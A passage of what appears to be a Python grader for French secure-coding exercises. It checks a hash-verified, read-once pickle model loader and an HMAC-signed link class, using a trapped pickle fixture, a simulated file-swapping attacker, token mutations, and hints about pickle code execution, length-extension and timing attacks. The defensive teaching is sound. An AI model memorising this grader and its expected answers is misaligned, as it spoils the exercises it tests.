    except Exception as exc:  # noqa: BLE001
        raise AssertionError(
            f"Avec un {description}, votre fonction lève {type(exc).__name__}: {exc}. Pour un fichier refusé, levez une "
            "ValueError (c'est ce que l'appelant attend) ; pour un fichier intact, renvoyez l'objet chargé.") from None


def verifier_charger_modele_verifie(f) -> None:
    _PIEGES.clear()
    with tempfile.TemporaryDirectory() as tmp:
        dossier = Path(tmp)
        chemin, piege = dossier / "churn_model.pkl", dossier / "piege.pkl"
        intact = pickle.dumps(_MODELE)
        chemin.write_bytes(intact)
        piege.write_bytes(pickle.dumps(_ObjetPiege()))
        empreinte = hashlib.sha256(intact).hexdigest()

        # 1. Le fichier intact se charge.
        obtenu, erreur = _appel_84(f, chemin, empreinte, "fichier intact")
        if erreur is not None:
            raise AssertionError(
                f"Votre fonction refuse le fichier INTACT ({erreur}). Calculez l'empreinte des OCTETS du fichier "
                "(et non de son nom) : `hashlib.sha256(Path(chemin).read_bytes()).hexdigest()`, puis comparez-la au "
                "texte reçu.")
        if obtenu is None:
            raise AssertionError("Pour un fichier intact, votre fonction renvoie None : avez-vous oublié le `return` ? "
                                 "Renvoyez l'objet chargé : `pickle.loads(octets)`.")
        if obtenu != _MODELE:
            raise AssertionError(f"Le fichier intact donne {_court(obtenu)} au lieu de {_MODELE}. Renvoyez l'objet "
                                 "chargé avec `pickle.loads(octets)`.")

        # 2. Une empreinte lue dans un fichier de manifeste : majuscules, fin de ligne.
        obtenu, erreur = _appel_84(f, chemin, empreinte.upper() + "\n", "empreinte en majuscules")
        if erreur is not None or obtenu != _MODELE:
            raise AssertionError(
                "L'empreinte attendue arrive en MAJUSCULES et suivie d'un retour à la ligne (c'est ainsi qu'on la lit "
                "dans un fichier de manifeste), et votre fonction refuse le fichier intact. Nettoyez-la avant de "
                "comparer : `empreinte_attendue.strip().lower()`.")

        # 3. Le fichier a été remplacé par un fichier piégé.
        chemin.write_bytes(piege.read_bytes())
        obtenu, erreur = _appel_84(f, chemin, empreinte, "fichier piégé")
        if _PIEGES:
            raise AssertionError(
                "Le fichier piégé a EXÉCUTÉ DU CODE pendant son chargement : vous avez chargé le fichier AVANT de "
                "vérifier son empreinte (ou sans la vérifier). `pickle.loads` exécute ce que le fichier lui demande ; "
                "un vrai attaquant aurait lancé `os.system(...)` avec les droits de votre API. Calculez et comparez "
                "l'empreinte d'abord, et ne chargez QUE si elle est bonne.")
        if erreur is None:
            raise AssertionError(f"Le fichier a été modifié (empreinte différente) et votre fonction renvoie "
                                 f"{_court(obtenu)} au lieu de lever une ValueError. "
                                 + ("Renvoyer None ne suffit pas : l'appelant peut ne pas le tester, et continuer sans "
                                    "modèle. Une exception l'arrête à coup sûr." if obtenu is None else
                                    "Si l'empreinte ne correspond pas, levez une ValueError, sans charger le fichier."))

        # 4. L'attaquant remplace le fichier ENTRE votre vérification et votre chargement.
        chemin.write_bytes(intact)
        attaquant = _AttaquantRapide(chemin, piege)
        with attaquant:
            obtenu, erreur = _appel_84(f, chemin, empreinte, "fichier remplacé entre deux lectures")
        if _PIEGES or (erreur is None and obtenu != _MODELE):
            raise AssertionError(
                f"Votre fonction ouvre le fichier {attaquant.ouvertures} fois : une fois pour calculer l'empreinte, une "
                "autre pour charger. Le correcteur a remplacé le fichier entre les deux (un attaquant rapide peut le "
                "faire) : vous avez vérifié le bon fichier, puis chargé le piégé. Lisez les octets UNE seule fois "
                "(`octets = Path(chemin).read_bytes()`), vérifiez-les, puis chargez CES octets : `pickle.loads(octets)`.")
        if erreur is not None:
            raise AssertionError(f"Avec un fichier intact, lu une seule fois, votre fonction lève : {erreur}.")


# ============================================================================ Défi 85 : lien signé


_SECRET = b"cle-du-correcteur-de-32-octets!!"
_AUTRE_SECRET = b"une-autre-cle-tout-aussi-longue!"
_EXPIRATION = 1_767_225_600     # 1er janvier 2026 à 0 h (UTC)
_AVANT = 1_000                  # longtemps avant : une expiration modifiée resterait dans le futur
_URL_SURE = re.compile(r"[A-Za-z0-9._~-]+")


def _nouveau_85(cls, secret: bytes):
    objet = cls(secret)
    for methode in ("signer", "verifier"):
        if not callable(getattr(objet, methode, None)):
            raise AssertionError(f"La classe Signataire doit avoir une méthode `{methode}`.")
    return objet


def _verifier_85(signataire, jeton: str, maintenant: int, contexte: str):
    """Renvoie (client, None) si le jeton est accepté, (None, exception) s'il est refusé par une ValueError."""
    try:
        return signataire.verifier(jeton, maintenant), None
    except NotImplementedError:
        raise
    except ValueError as exc:
        return None, exc
    except Exception as exc:  # noqa: BLE001 — n'importe quelle autre erreur de l'élève
        raise AssertionError(
            f"`verifier({jeton!r}, {maintenant})` ({contexte}) plante avec {type(exc).__name__}: {exc}. Un jeton vient "
            "de l'extérieur : n'importe quel texte peut arriver. Refusez tout ce qui n'a pas la bonne forme avec une "
            "ValueError (dans l'API, elle deviendra un 400) ; une autre exception deviendrait une erreur 500."
            + (" `hmac.compare_digest` refuse le texte non ASCII : comparez des octets (`.encode()`) ou vérifiez la "
               "forme du jeton d'abord." if isinstance(exc, TypeError) and "non-ASCII" in str(exc) else "")
        ) from None


def _mutations(jeton: str):
    """Chaque variante du jeton à un caractère près (remplacé), ou deux caractères voisins échangés."""
    def voisin(c: str) -> str:
        if c.isdigit():
            return str((int(c) + 1) % 10)
        if "a" <= c <= "z":
            return chr((ord(c) - 97 + 1) % 26 + 97)
        if "A" <= c <= "Z":
            return chr((ord(c) - 65 + 1) % 26 + 65)
        return "_" if c != "_" else "-"

    for i, c in enumerate(jeton):
        yield f"le caractère n°{i + 1} ({c!r}) remplacé", jeton[:i] + voisin(c) + jeton[i + 1:], False
    for i in range(len(jeton) - 1):
        if jeton[i] != jeton[i + 1]:
            echange = jeton[:i] + jeton[i + 1] + jeton[i] + jeton[i + 2:]
            separateur = not (jeton[i].isalnum() and jeton[i + 1].isalnum())
            yield f"les caractères n°{i + 1} et {i + 2} échangés", echange, separateur


def _constructions_maison(jeton: str, client_id: str, expiration: int) -> bool:
    """Le jeton contient-il sha256(secret + message) ou sha256(message + secret) ? (au lieu d'un HMAC)"""
    import base64

    for sep in [".", ":", "|", "-", "_", ",", ";", "&", "/", " ", ""]:
        for message in (f"{client_id}{sep}{expiration}", f"{expiration}{sep}{client_id}"):
            for donnees in (_SECRET + message.encode(), message.encode() + _SECRET):
                for algo in (hashlib.sha256, hashlib.md5, hashlib.sha1):
                    brut = algo(donnees).digest()
                    formes = {brut.hex(), base64.urlsafe_b64encode(brut).decode().rstrip("="),
                              base64.b64encode(brut).decode().rstrip("=")}
                    if any(forme in jeton for forme in formes):
                        return True
    return False


def _utilise_compare_digest(cls) -> bool:
    """Le CODE de la classe (pas ses commentaires ni ses docstrings) appelle-t-il compare_digest ?

    On regarde aussi les fonctions du module que la classe appelle (une fonction d'aide, par exemple).
    """
    try:
        sources = [textwrap.dedent(inspect.getsource(cls))]
    except (OSError, TypeError):
        return True  # classe définie dans un terminal : on ne peut pas relire son code
    module = inspect.getmodule(cls)
    for nom in {n.id for n in ast.walk(ast.parse(sources[0])) if isinstance(n, ast.Name)}:
        fonction = getattr(module, nom, None)
        if inspect.isfunction(fonction):
            try:
                sources.append(textwrap.dedent(inspect.getsource(fonction)))
            except (OSError, TypeError):
                pass
    return any((isinstance(n, ast.Attribute) and n.attr == "compare_digest")
               or (isinstance(n, ast.Name) and n.id == "compare_digest")
               for source in sources for n in ast.walk(ast.parse(source)))


def verifier_signataire(cls) -> None:
    if not inspect.isclass(cls):
        raise AssertionError("`Signataire` doit être une CLASSE (`class Signataire:`), avec __init__, signer et verifier.")
    signataire = _nouveau_85(cls, _SECRET)

    # 1. Une clé trop courte.
    try:
        cls(b"court")
    except ValueError:
        pass
    else:
        raise AssertionError("`Signataire(b\"court\")` est accepté. Une clé de 5 octets se devine en essayant toutes les "
                             "possibilités : dans __init__, levez une ValueError si `len(secret) < 16`.")

    # 2. Le parcours honnête : signer, puis vérifier.
    jeton = signataire.signer("C001", _EXPIRATION)
    if not isinstance(jeton, str) or not jeton:
        raise AssertionError(f"`signer('C001', {_EXPIRATION})` doit renvoyer le jeton sous forme de texte, pas {_court(jeton)}.")
    if not _URL_SURE.fullmatch(jeton):
        interdits = sorted({c for c in jeton if not _URL_SURE.fullmatch(c)})
        raise AssertionError(f"Le jeton {_court(jeton)} contient des caractères qui ne passent pas tels quels dans une "
                             f"adresse web : {interdits}. Utilisez `hexdigest()`, ou `base64.urlsafe_b64encode` (sans "
                             "les « = » finaux), et des séparateurs comme « . ».")
    for maintenant in (_AVANT, _EXPIRATION - 1):
        client, erreur = _verifier_85(signataire, jeton, maintenant, "jeton tout juste signé")
        if erreur is not None or client != "C001":
            raise AssertionError(f"`verifier(signer('C001', {_EXPIRATION}), maintenant={maintenant})` doit renvoyer "
                                 f"'C001', or elle " + (f"lève : {erreur}" if erreur else f"renvoie {_court(client)}") + ".")
    for autre_id in ("C042", "C-7_b", "Client_" + "9" * 30):
        client, erreur = _verifier_85(signataire, signataire.signer(autre_id, _EXPIRATION), _AVANT, f"client {autre_id}")
        if client != autre_id:
            raise AssertionError(f"Le jeton signé pour {autre_id!r} donne " + (f"une erreur ({erreur})" if erreur else
                                 f"{_court(client)}") + f" au lieu de {autre_id!r}. Les identifiants peuvent contenir "
                                 "lettres, chiffres, « - » et « _ ».")

    # 3. Un autre objet avec le même secret (un autre serveur, ou le même après redémarrage).
    client, erreur = _verifier_85(_nouveau_85(cls, _SECRET), jeton, _AVANT, "nouvel objet, même secret")
    if client != "C001":
        raise AssertionError("Un NOUVEL objet `Signataire` créé avec le même secret refuse le jeton (" + str(erreur) +
                             "). Après un redémarrage du serveur, tous les liens déjà envoyés seraient cassés. La "
                             "signature ne doit dépendre que du secret et du contenu : pas de clé tirée au hasard dans "
                             "__init__, pas de mémoire des jetons émis.")

    # 4. La signature dépend du secret.
    autre = _nouveau_85(cls, _AUTRE_SECRET)
    jeton_autre = autre.signer("C001", _EXPIRATION)
    if jeton_autre == jeton:
        raise AssertionError("Deux secrets différents donnent le même jeton : votre signature ne dépend pas du secret. "
                             "N'importe qui pourrait donc fabriquer un lien valide. Signez avec "
                             "`hmac.new(secret, message, hashlib.sha256)`.")
    client, _ = _verifier_85(signataire, jeton_autre, _AVANT, "jeton signé avec un autre secret")
    if client is not None:
        raise AssertionError("Un jeton signé avec un AUTRE secret est accepté : vérifiez la signature, en la recalculant "
                             "avec votre secret.")

    # 5. L'expiration.
    for maintenant, quand in ((_EXPIRATION, "à la seconde même de l'expiration"), (_EXPIRATION + 86_400, "un jour après")):
        client, _ = _verifier_85(signataire, jeton, maintenant, quand)
        if client is not None:
            raise AssertionError(f"Le lien est accepté {quand} (maintenant={maintenant}, expiration={_EXPIRATION}). Un "
                                 "lien expiré doit lever une ValueError : refusez-le dès que `maintenant >= expiration`.")

    # 6. Un attaquant modifie le jeton : chaque modification doit être refusée.
    for quoi, modifie, separateur in _mutations(jeton):
        client, _ = _verifier_85(signataire, modifie, _AVANT, f"jeton modifié : {quoi}")
        if client is None:
            continue
        if client != "C001":
            conseil = ("Les champs du message signé doivent être SÉPARÉS : sans séparateur, (« C001 », 1767225600) et "
                       "(« C0011 », 767225600) donnent le même texte « C0011767225600 », donc la même signature. Signez "
                       "f\"{client_id}.{expiration}\"." if separateur else
                       "La signature doit couvrir l'identifiant du client.")
            raise AssertionError(f"Jeton modifié ({quoi}) : {modifie!r}. Votre fonction l'accepte et renvoie {client!r} : "
                                 f"un attaquant peut désinscrire un AUTRE client que le sien. {conseil}")
        client_plus_tard, _ = _verifier_85(signataire, modifie, _EXPIRATION, f"jeton modifié ({quoi}), après expiration")
        if client_plus_tard is not None:
            raise AssertionError(f"Jeton modifié ({quoi}) : {modifie!r}. Votre fonction l'accepte encore APRÈS la date "
                                 "d'expiration du vrai jeton : l'attaquant a prolongé son lien. La signature doit couvrir "
                                 "l'expiration autant que le client : signez le message complet, "
                                 "f\"{client_id}.{expiration}\", et recalculez-le à partir du jeton reçu.")

    # 7. N'importe quel texte peut arriver : tout ce qui n'est pas un jeton est refusé par une ValueError.
    for dechet in ["", "C001", "C001.", f"C001.{_EXPIRATION}", f"C001.{_EXPIRATION}.", "..", "C001.abc.def",
                   f"C001.{_EXPIRATION}.{'0' * 64}", f"C001.{_EXPIRATION}.zz", jeton + ".en_trop", jeton[:-1],
                   f"C001.{_EXPIRATION}.é{'0' * 63}", "é.1.x", f"C001.-5.{'a' * 64}"]:
        client, _ = _verifier_85(signataire, dechet, _AVANT, "jeton mal formé")
        if client is not None:
            raise AssertionError(f"Le texte {dechet!r} n'est pas un jeton signé par vous, et votre fonction l'accepte "
                                 f"(elle renvoie {client!r}).")

    # 8. Les deux réflexes de pro, invisibles de l'extérieur.
    if _constructions_maison(jeton, "C001", _EXPIRATION):
        raise AssertionError("Votre signature ressemble à hash(secret + message) : une construction « maison ». Avec SHA-256, "
                             "elle permet d'allonger un message signé sans connaître le secret (attaque par extension de "
                             "longueur). C'est exactement le problème que résout HMAC : "
                             "`hmac.new(secret, message.encode(), hashlib.sha256).hexdigest()`.")
    if not _utilise_compare_digest(cls):
        raise AssertionError("Tout fonctionne, sauf un détail invisible : comparez les signatures avec "
                             "`hmac.compare_digest(a, b)` plutôt qu'avec `==`. `==` s'arrête au premier caractère "
                             "différent : en mesurant le temps de réponse, un attaquant devine la signature caractère par "
                             "caractère. `compare_digest` prend toujours le même temps.")


SERIE = Serie(
    code="13",
    titre="Écrire du code sûr : injection SQL, secrets, chemins, formules, pickle, liens signés",
    module_eleve="defis.serie_13",
    module_corrige="defis.corrige_serie_13",
    defis=(
        Defi(80, "clients_par_nom", "🟢", "—", verifier_clients_par_nom),
        Defi(81, "masquer_secrets", "🟢", "—", verifier_masquer_secrets),
        Defi(82, "chemin_export", "🟡", "—", verifier_chemin_export),
        Defi(83, "neutraliser_formules", "🟡", "—", verifier_neutraliser_formules),
        Defi(84, "charger_modele_verifie", "🟡", "6.2", verifier_charger_modele_verifie),
        Defi(85, "Signataire", "🔴", "—", verifier_signataire),
    ),
)
